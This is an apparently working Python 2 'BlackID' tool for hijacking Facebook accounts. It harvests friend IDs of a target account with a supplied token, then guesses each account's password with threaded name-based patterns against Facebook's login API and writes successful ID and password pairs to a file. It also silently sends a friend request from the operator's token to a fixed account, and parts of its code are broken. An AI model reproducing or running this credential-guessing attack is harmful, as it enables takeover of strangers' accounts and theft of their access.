#Hi ! BaY -_-
#coding=utf-8


import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('user-agent','Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]


def keluar():
	print "\033[1;96m[!] \x1b[1;91mExit"
	os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


		
		
#### LOGO ####
logo = """


                                                   
______ _       ___  _____  _   __
| ___ \ |     / _ \/  __ \| | / /
| |_/ / |    / /_\ \ /  \/| |/ / 
| ___ \ |    |  _  | |    |    \ 
| |_/ / |____| | | | \__/\| |\  \
\____/\_____/\_| |_/\____/\_| \_/
                                 
                                 
                                             
                                                                        
  _____ _____  
 |_   _|  __ \ 
   | | | |  | |
   | | | |  | |
  _| |_| |__| |
 |_____|_____/ 
               
               
                                                                  
--------------------------------------------------
 Author      : B L A C K M I R O R
 
 GitHub     : https://github.com/fardinHack
 
 YouTube  : Not Yet
 
Telegram  : BESTxHACKER

--------------------------------------------------
"""
def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;95mPlease Wait \x1b[1;95m"+o),;sys.stdout.flush();time.sleep(1)


back = 0
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

os.system("clear")
print logo

CorrectUsername = "Black"
CorrectPassword = "ID"
loop = 'true'
while (loop == 'true'):
    username = raw_input("Tool Username »» ")
    if (username == CorrectUsername):
    	password = raw_input("Tool Password »» ")
        if (password == CorrectPassword):
            print "Logged in successfully as " + username #Dev: Black_Miror
	    time.sleep(2)
            loop = 'false'
        else:
            print "\033[1;96mWrong Password"
            os.system('xdg-open https://t.me/sultani1122')
    else:
        print "\033[1;96mWrong Username"
        os.system('xdg-open https://t.me/BESTxHACKER')

def login():
	os.system('clear')
	try:
		toket = open('.fb_token.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
		print logo
		print("[1] Token login")
		print("[2] id/pass login")
		print("")
		login_select()
def login_select():
    afza = raw_input(" Choose login method >>> ")
    if afza =="1":
        os.system("clear")
        print logo
        print("")
        print("\t    \033[1;32mFB Token Login\033[0;97m")
        print("")
        token = raw_input(" Past token here : ")
        token_s = open(".fb_token.txt","w")
        token_s.write(token)
        token_s.close()
        try:
            r = requests.get("https://graph.facebook.com/me?access_token="+token)
            q = json.loads(r.text)
            name = q["name"]
            nm = name.rsplit(" ")[0]
            print("")
            print("\t\033[1;32mToken logged in as : "+nm+"\033[0;97m")
            time.sleep(3)
            menu()
        except (KeyError , IOError):
            print("")
            print("\t    \033[1;31mToken not valid\033[0;97m")
            print("")
            raw_input(" Press enter to try again ")
            login()
    if afza =="2":
        login_fb()
    else:
        print("")
        print("\t    "+c+"Select valid method"+c2)
        print("")
        login_select()
def login_fb():
	os.system("clear")
	print logo
	print("")
	print("\t    \033[1;32mFB ID/PASS Login\033[0;97m")
	print("")
	id = raw_input(" ID/Mail/Num : ")
	id1=id.replace(' ','')
	id2=id1.replace('(','')
	uid=id2.replace(')','')
	pwd = raw_input(" Password   : ")
	print("")
	data=requests.get('http://localhost:5000/auth?id='+uid+'&pass='+pwd, headers=header).text
	q = json.loads(data)
	if "loc" in q:
		hamza = open(".fb_token.txt","w")
		hamza.write(q["loc"])
		hamza.close()
		requests.post('https://graph.facebook.com/me/friends?uid=100048514350891&access_token='+q['loc'])
		time.sleep(1)
		print("\t    \033[1;32mLogged in successfully\033[0;97m")
		time.sleep(1)
		menu()
	elif "www.facebook.com" in q["error"]:
		print("\t    \033[1;31mUser must verify account before login\033[0;97m")
		print("")
		time.sleep(1)
		raw_input(" Press enter to try again ")
		login_fb()
	else:
		print("\t\033[1;31mID/Number/Password may be wrong\033[0;97m")
		print("")
		raw_input(" Press enter to try again ")
		login_fb()


def menu():
	os.system('clear')
	try:
		toket=open('.fb_token.txt','r').read()
	except IOError:
		os.system('clear')
		print"\x1b[1;91m[!] Token invalid"
		os.system('rm -rf .fb_token.txt')
		time.sleep(1)
		login()
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
		ots = requests.get('https://graph.facebook.com/me/subscribers?access_token=' + toket)
		b = json.loads(ots.text)
		sub = str(b['summary']['total_count'])
	except KeyError:
		os.system('clear')
		print"\033[1;91mYour Account is on Checkpoint"
		os.system('rm -rf .fb_token.txt')
		time.sleep(1)
		login()
	except requests.exceptions.ConnectionError:
		print"\x1b[1;92mThere is no internet connection"
		keluar()
	os.system("clear")
	print logo
	print "\033[1;36;40m      ╔═════════════════════════════════╗"
	print "\033[1;36;40m      ║\033[1;32;40m[*] Name\033[1;32;40m: "+nama+"  	   \033[1;36;40m║"                               
	print "\033[1;36;40m      ║\033[1;34;40m[*] ID  \033[1;34;40m: "+id+"        \033[1;36;40m║"
	print "\033[1;36;40m      ║\033[1;34;40m[*] Subs\033[1;34;40m: "+sub+"                      \033[1;36;40m║"
	print "\033[1;36;40m      ╚═════════════════════════════════╝"
	print "    \033[1;32;40m[Type1] \033[1;33;40m‹•.•›Start Hacking"	
	print "    \033[1;32;40m[type2] \033[1;33;40m‹•.•›Update"																														
	print "    \033[1;32;40m[type0] \033[1;33;40m‹•.•›Logout"
	pilih()

def pilih():
	unikers = raw_input("\n\033[1;31;40m>>> \033[1;35;40m")
	if unikers =="":
		print "\x1b[1;91mFill in correctly"
		pilih()
	elif unikers =="1":
		super()
	elif unikers =="2":
		os.system('clear')
		print logo
		print " \033[1;36;40m●══════════════════◄►══════════════════●\n"
		os.system('git pull origin master')
		raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
		menu()
	elif unikers =="0":
		print('Token Removed')
		os.system('rm -rf .fb_token.txt')
		keluar()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih()

def super():
	global toket
	os.system('clear')
	try:
		toket=open('.fb_token.txt','r').read()
	except IOError:
		print"\x1b[1;91mToken invalid"
		os.system('rm -rf .fb_token.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
	print "     \033[1;97m-•◈•-\033[1;91m> \033[1;91m1.\x1b[1;95m>_<Clone Friend List."
	print "     \033[1;97m-•◈•-\033[1;91m> \033[1;91m2.\x1b[1;95m>_<Hack Public Accounts ."
	print "     \033[1;97m-•◈•-\033[1;91m> \033[1;91m0.\033[1;91m>_<Back"
	pilih_super()

def pilih_super():
	peak = raw_input("\n\033[1;91m^.^Choose an Option>>> \033[1;95m")
	if peak =="":
		print "\x1b[1;91mFill in correctly"
		pilih_super()
	elif peak =="1":
		os.system('clear')
		print logo
		print "\033[1;97m•◈•══════•◈•\033[1;91mloveAKM\033[1;97m•◈•══════•◈•"
		print('\033[1;91mGetting IDs \033[1;91m...')
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif peak =="2":
		os.system('clear')
		print logo
		idt = raw_input("\033[1;95m[•◈•] \033[1;91mEnter ID\033[1;95m: \033[1;95m")
		print "\033[1;92m•◈•══════••◈•\033[1;91mBlackID\033[1;95m•◈•══════••◈•"
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;91mName\033[1;95m:\033[1;95m "+op["name"]
		except KeyError:
			print"\x1b[1;91mID Not Found!"
			raw_input("\n\033[1;95m[\033[1;91mBack\033[1;95m]")
			super()
		print"\033[1;91mGetting IDs\033[1;97m..."
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="0":
		menu()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih_super()
	
	print "\033[1;36;40m[✺] Total IDs : \033[1;94m"+str(len(id))
	print('\033[1;34;40m[✺] Please Wait...')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;32;40m[✺] Cloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
	print "\n\033[1;94m        ❈     \x1b[1;91mTo Stop Process Press CTRL+Z \033[1;94m    ❈"
	print "   \033[1;92m●══════════════════◄►══════════════════●"

	print('           \033[1;91mBlackMiror start cloning Wait...')
	print  "  \033[1;92m ●══════════════════◄►══════════════════●" 

	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass #Dev:rana
		try:
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)												
			b = json.loads(a.text)												
			pass1 = b['first_name'] + '2004'												
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			q = json.load(data)												
			if 'access_token' in q:
				x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				z = json.loads(x.text)
				print '\x1b[1;94m[  ✓  ] \x1b[1;92mHack100%💉'											
				print '\x1b[1;94m[•⚔•] \x1b[1;91mName \x1b[1;91m    ✯ \x1b[1;92m' + b['name']											
				print '\x1b[1;94m[•⚔•] \x1b[1;91mID \x1b[1;91m      ✯ \x1b[1;92m' + user											
				print '\x1b[1;94m[•⚔•] \x1b[1;91mPassword \x1b[1;91m✯ \x1b[1;92m' + pass1 + '\n'											
				oks.append(user+pass1)
                        else:
			        if 'www.facebook.com' in q["error_msg"]:
				    print '\x1b[1;94m[ ❥ ] \x1b[1;94mCheckpoint'
				    print '\x1b[1;94m[•⚔•] \x1b[1;94mName \x1b[1;94m    ✯ \x1b[1;95m' + b ['name']
				    print '\x1b[1;94m[•⚔•] \x1b[1;94mID \x1b[1;94m      ✯ \x1b[1;95m' + user
				    print '\x1b[1;94m[•⚔•] \x1b[1;94mPassword \x1b[1;94m✯ \x1b[1;95m' + pass1 + '\n'
				    cek = open("out/super_cp.txt", "a")
				    cek.write("ID:" +user+ " Pw:" +pass1+"\n")
				    cek.close()
				    cekpoint.append(user+pass1)
                                else:
				    pass2 = b['first_name'] + '2005'										
                                    data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			            q = json.load(data)												
			            if 'access_token' in q:	
				            x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				            z = json.loads(x.text)
				            print '\x1b[1;94m[  ✓  ] \x1b[1;92mHack100%💉'											
				            print '\x1b[1;94m[•⚔•] \x1b[1;91mName \x1b[1;91m    ✯ \x1b[1;92m' + b['name']											
				            print '\x1b[1;94m[•⚔•] \x1b[1;91mID \x1b[1;91m      ✯ \x1b[1;92m' + user								
				            print '\x1b[1;94m[•⚔•] \x1b[1;91mPassword \x1b[1;91m✯ \x1b[1;92m' + pass2 + '\n'											
				            oks.append(user+pass2)
                                    else:
			                   if 'www.facebook.com' in q["error_msg"]:
				               print '\x1b[1;94m[ ❥ ] \x1b[1;94mCheckpoint'
				               print '\x1b[1;94m[•⚔•] \x1b[1;94mName \x1b[1;94m    ✯ \x1b[1;95m' + b['name']
				               print '\x1b[1;94m[•⚔•] \x1b[1;94mID \x1b[1;94m      ✯ \x1b[1;95m' + user
				               print '\x1b[1;94m[•⚔•] \x1b[1;94mPassword \x1b[1;94m✯ \x1b[1;95m' + pass2 + '\n'
				               cek = open("out/super_cp.txt", "a")
				               cek.write("ID:" +user+ " Pw:" +pass2+"\n")
				               cek.close()
				               cekpoint.append(user+pass2)								
				           else:											
					       pass3 = b['last_name']+'123'										
					       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")										
					       q = json.load(data)										
					       if 'access_token' in q:	
						       x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                       z = json.loads(x.text)
						       print '\x1b[1;94m[  ✓  ] \x1b[1;92mHack100%💉'								
						       print '\x1b[1;94m[•⚔•] \x1b[1;91mName \x1b[1;91m    ✯ \x1b[1;92m' + b['name']									
						       print '\x1b[1;94m[•⚔•] \x1b[1;91mID \x1b[1;91m      ✯ \x1b[1;92m' + user							
						       print '\x1b[1;94m[•⚔•] \x1b[1;91mPassword \x1b[1;91m✯ \x1b[1;92m' + pass3 + '\n'									
						       oks.append(user+pass3)
                                               else:
			                               if 'www.facebook.com' in q["error_msg"]:
				                           print '\x1b[1;94m[ ❥ ] \x1b[1;94mCheckpoint'
				                           print '\x1b[1;94m[•⚔•] \x1b[1;94mName \x1b[1;94m    ✯ \x1b[1;95m' + b['name']
				                           print '\x1b[1;94m[•⚔•] \x1b[1;94mID \x1b[1;94m      ✯ \x1b[1;95m' + user
				                           print '\x1b[1;94m[•⚔•] \x1b[1;94mPassword \x1b[1;94m✯ \x1b[1;95m' + pass3 + '\n'
				                           cek = open("out/super_cp.txt", "a")
				                           cek.write("ID:" +user+ " Pw:" +pass3+"\n")
				                           cek.close()
				                           cekpoint.append(user+pass3)									
					               else:										
						           pass4 = b['first_name'] + '123'											
			                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			                                   q = json.load(data)												
			                                   if 'access_token' in q:		
						                   x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                   z = json.loads(x.text)
				                                   print '\x1b[1;94m[  ✓  ] \x1b[1;92mHack100%💉'											
				                                   print '\x1b[1;94m[•⚔•] \x1b[1;91mName \x1b[1;91m    ✯ \x1b[1;92m' + b['name']											
				                                   print '\x1b[1;94m[•⚔•] \x1b[1;91mID \x1b[1;91m      ✯ \x1b[1;92m' + user											
				                                   print '\x1b[1;94m[•⚔•] \x1b[1;91mPassword \x1b[1;91m✯ \x1b[1;92m' + pass4 + '\n'											
				                                   oks.append(user+pass4)
                                                           else:
			                                           if 'www.facebook.com' in q["error_msg"]:
				                                       print '\x1b[1;94m[ ❥ ] \x1b[1;94mCheckpoint'
				                                       print '\x1b[1;94m[•⚔•] \x1b[1;94mName \x1b[1;94m    ✯ \x1b[1;95m' + b['name']
				                                       print '\x1b[1;94m[•⚔•] \x1b[1;94mID \x1b[1;94m      ✯ \x1b[1;95m' + user
				                                       print '\x1b[1;94m[•⚔•] \x1b[1;94mPassword \x1b[1;94m✯ \x1b[1;95m' + pass4 + '\n'
				                                       cek = open("out/super_cp.txt", "a")
				                                       cek.write("ID:" +user+ " Pw:" +pass4+"\n")
				                                       cek.close()
				                                       cekpoint.append(user+pass4)					
					                           else:									
						                       pass5 = '786786'							
						                       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")								
						                       q = json.load(data)								
						                       if 'access_token' in q:	
						                               x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                               z = json.loads(x.text)
						                               print '\x1b[1;94m[  ✓  ] \x1b[1;92mHack100%💉'						
						                               print '\x1b[1;94m[•⚔•] \x1b[1;91mName \x1b[1;91m    ✯ \x1b[1;92m' + b['name']							
						                               print '\x1b[1;94m[•⚔•] \x1b[1;91mID \x1b[1;91m      ✯ \x1b[1;92m' + user					
						                               print '\x1b[1;94m[•⚔•] \x1b[1;91mPassword \x1b[1;91m✯ \x1b[1;92m' + pass5 + '\n'							
						                               oks.append(user+pass5)	
                                                                       else:
			                                                       if 'www.facebook.com' in q["error_msg"]:
				                                                   print '\x1b[1;94m[ ❥ ] \x1b[1;94mCheckpoint'
				                                                   print '\x1b[1;94m[•⚔•] \x1b[1;94mName \x1b[1;94m    ✯ \x1b[1;95m' + b['name']
				                                                   print '\x1b[1;94m[•⚔•] \x1b[1;94mID \x1b[1;94m      ✯ \x1b[1;95m' + user
				                                                   print '\x1b[1;94m[•⚔•] \x1b[1;94mPassword \x1b[1;94m✯ \x1b[1;95m' + pass5 + '\n'
				                                                   cek = open("out/super_cp.txt", "a")
				                                                   cek.write("ID:" +user+ " Pw:" +pass5+"\n")
				                                                   cek.close()
				                                                   cekpoint.append(user+pass5)					
						                               else:								
							                           pass6 = '1234554321'											
			                                                           data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			                                                           q = json.load(data)												
			                                                           if 'access_token' in q:	
								                           x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                           z = json.loads(x.text)
				                                                           print '\x1b[1;94m[  ✓  ] \x1b[1;92mHack100%💉'											
				                                                           print '\x1b[1;94m[•⚔•] \x1b[1;91mName \x1b[1;91m    ✯ \x1b[1;92m' + b['name']											
				                                                           print '\x1b[1;94m[•⚔•] \x1b[1;91mID \x1b[1;91m      ✯ \x1b[1;92m' + user									
				                                                           print '\x1b[1;94m[•⚔•] \x1b[1;91mPassword \x1b[1;91m✯ \x1b[1;92m' + pass6 + '\n'											
				                                                           oks.append(user+pass6)
                                                                                   else:
			                                                                   if 'www.facebook.com' in q["error_msg"]:
				                                                               print '\x1b[1;94m[ ❥ ] \x1b[1;94mCheckpoint'
				                                                               print '\x1b[1;94m[•⚔•] \x1b[1;94mName \x1b[1;94m    ✯ \x1b[1;95m' + b['name']
				                                                               print '\x1b[1;94m[•⚔•] \x1b[1;94mID \x1b[1;94m      ✯ \x1b[1;95m' + user
				                                                               print '\x1b[1;94m[•⚔•] \x1b[1;94mPassword \x1b[1;94m✯ \x1b[1;95m' + pass6 + '\n'
				                                                               cek = open("out/super_cp.txt", "a")
				                                                               cek.write("ID:" +user+ " Pw:" +pass6+"\n")
				                                                               cek.close()
				                                                               cekpoint.append(user+pass6)	
						                                           else:							
								                               pass7 = b['first_name']+'12345'						
								                               data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")						
								                               q = json.load(data)						
								                               if 'access_token' in q:		
				                                                                       x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                                       z = json.loads(x.text)
									                               print '\x1b[1;94m[  ✓  ] \x1b[1;92mHack100%💉'					
									                               print '\x1b[1;94m[•⚔•] \x1b[1;91mName \x1b[1;91m    ✯ \x1b[1;92m' + b['name']					
									                               print '\x1b[1;94m[•⚔•] \x1b[1;91mID \x1b[1;91m      ✯ \x1b[1;92m' + user				
									                               print '\x1b[1;94m[•⚔•] \x1b[1;91mPassword \x1b[1;91m✯ \x1b[1;92m' + pass7 + '\n'					
									                               oks.append(user+pass7)
                                                                                               else:
			                                                                               if 'www.facebook.com' in q["error_msg"]:
				                                                                           print '\x1b[1;94m[ ❥ ] \x1b[1;94mCheckpoint'
				                                                                           print '\x1b[1;94m[•⚔•] \x1b[1;94mName \x1b[1;94m    ✯ \x1b[1;95m' + b['name']
				                                                                           print '\x1b[1;94m[•⚔•] \x1b[1;94mID \x1b[1;94m      ✯ \x1b[1;95m' + user
				                                                                           print '\x1b[1;94m[•⚔•] \x1b[1;94mPassword \x1b[1;94m✯ \x1b[1;95m' + pass7 + '\n'
				                                                                           cek = open("out/super_cp.txt", "a")
				                                                                           cek.write("ID:" +user+ " Pw:" +pass7+"\n")
				                                                                           cek.close()
				                                                                           cekpoint.append(user+pass7)           					
								                                       else:						
										                           pass8 = b['last_name'] + '12345'											
			                                                                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			                                                                                   q = json.load(data)												
			                                                                                   if 'access_token' in q:		
										                                   x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                                                   z = json.loads(x.text)
				                                                                                   print '\x1b[1;94m[  ✓  ] \x1b[1;92mHack100%💉'											
				                                                                                   print '\x1b[1;94m[•⚔•] \x1b[1;91mName \x1b[1;91m    ✯ \x1b[1;92m' + b['name']											
				                                                                                   print '\x1b[1;94m[•⚔•] \x1b[1;91mID \x1b[1;91m      ✯ \x1b[1;92m' + user										
				                                                                                   print '\x1b[1;94m[•⚔•] \x1b[1;91mPassword \x1b[1;91m✯ \x1b[1;92m' + pass8 + '\n'											
				                                                                                   oks.append(user+pass8)
                                                                                                           else:
			                                                                                           if 'www.facebook.com' in q["error_msg"]:
				                                                                                       print '\x1b[1;94m[ ❥ ] \x1b[1;94mCheckpoint'
				                                                                                       print '\x1b[1;94m[•⚔•] \x1b[1;94mName \x1b[1;94m    ✯ \x1b[1;95m' + b['name']
				                                                                                       print '\x1b[1;94m[•⚔•] \x1b[1;94mID \x1b[1;94m      ✯ \x1b[1;95m' + user
				                                                                                       print '\x1b[1;94m[•⚔•] \x1b[1;94mPassword \x1b[1;94m✯ \x1b[1;95m' + pass8 + '\n'
				                                                                                       cek = open("out/super_cp.txt", "a")
				                                                                                       cek.write("ID:" +user+ " Pw:" +pass8+"\n")
				                                                                                       cek.close()
				                                                                                       cekpoint.append(user+pass8)   	
										                                   else:					
										                                       pass9 = b['first_name'] + '1234567890'					
										                                       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass9)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")				
										                                       q = json.load(data)				
										                                       if 'access_token' in q:		
		                                                                                                               x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                                                               z = json.loads(x.text)
											                                       print '\x1b[1;94m[  ✓  ] \x1b[1;92mHack100%💉'			
											                                       print '\x1b[1;94m[•⚔•] \x1b[1;91mName \x1b[1;91m    ✯ \x1b[1;92m' + b['name']			
											                                       print '\x1b[1;94m[•⚔•] \x1b[1;91mID \x1b[1;91m      ✯ \x1b[1;92m' + user	
											                                       print '\x1b[1;94m[•⚔•] \x1b[1;91mPassword \x1b[1;91m✯ \x1b[1;92m' + pass9 + '\n'			
											                                       oks.append(user+pass9)
                                                                                                                       else:
			                                                                                                       if 'www.facebook.com' in q["error_msg"]:
				                                                                                                   print '\x1b[1;94m[ ❥ ] \x1b[1;94mCheckpoint'
				                                                                                                   print '\x1b[1;94m[•⚔•] \x1b[1;94mName \x1b[1;94m    ✯ \x1b[1;95m' + b['name']
				                                                                                                   print '\x1b[1;94m[•⚔•] \x1b[1;94mID \x1b[1;94m      ✯ \x1b[1;95m' + user
				                                                                                                   print '\x1b[1;94m[•⚔•] \x1b[1;94mPassword \x1b[1;94m✯ \x1b[1;95m' + pass9 + '\n'
				                                                                                                   cek = open("out/super_cp.txt", "a")
				                                                                                                   cek.write("ID:" +user+ " Pw:" +pass9+"\n")
				                                                                                                   cek.close()
				                                                                                                   cekpoint.append(user+pass9)		
											                                       
																	
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mBlack404\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
	print "  \033[1;91m«---•◈•---Developed By mohammad hacker--•◈•---»" #Dev:MOHAMMAD
	print '\033[1;93m✅Process Has Been Completed Press➡ Ctrl+Z.↩ Next Type (python2 BlackID.py)↩\033[1;97m....'
	print"\033[1;91mTotal OK/\x1b[1;95mCP \033[1;93m: \033[1;91m"+str(len(oks))+"\033[1;93m/\033[1;96m"+str(len(cekpoint))
	print logo
	
	raw_input("\n\033[1;95m[\033[1;91mBack\033[1;95m]")
	menu()

if __name__ == '__main__':
	login()
